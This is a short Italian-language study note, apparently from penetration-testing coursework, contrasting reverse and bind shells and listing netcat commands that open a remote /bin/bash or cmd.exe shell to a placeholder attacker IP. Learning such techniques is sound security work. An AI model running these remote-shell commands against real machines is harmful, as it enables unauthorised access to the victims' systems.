Quando si tratta di sfruttare un bersaglio, siamo interessati a **due** tipi di **shell**: le **reverse shell** e le **bind shell**

- **Reverse shell** é quella shell che stabilisce una connessione **DAL** pc target **AL** pc attaccante. Questo serve per **bipassare** il **firewall**.  Tuttavia, lo svantaggio è che, quando ricevi una shell da una macchina attraverso Internet, dovresti configurare la tua rete per accettare la shell.
- **Binding shell** è quando **l’attaccante** si **connette** **ad un target** che si è messo **in ascolto** In questo caso è piu facile essere rilevati da un antivirus ma non c’è bisogno di una configurazione internet.

# Shell inversa

1. `sudo nc -lvnp PORT` ****Dal ****pc Attaccante 
2. `nc -nv IP_ATTACCANTE PORT -c /bin/bash`  ****dal pc target, crea una shell (se la vittima è UNIX)
    1. `./nc.exe -nv IP_ATTACCANTE PORT -e cmd.exe` se la vittima è WINDOWS

# Bind Shell

Avviamo una shell da Windwos tramite netcat (target) e ci connettiamo da kali

1. **`./nc.exe -lvnp porta -e cmd.exe`** dal pc target **(nc.exe se windows)**
2. **`nc -nv IP_TARGET PORT`** dal pc attaccante

OPPURE al contrario, ci mettiamo in  avviamo al shell su kali e connettiamo da Windows

1. `nc -nvlp 1234 -c /bin/bash` dal PC attaccante
2. `./nc.exe -nv IP_ATTACCANTE PORT`  dal pc vittima (**nc.exe se windows)**
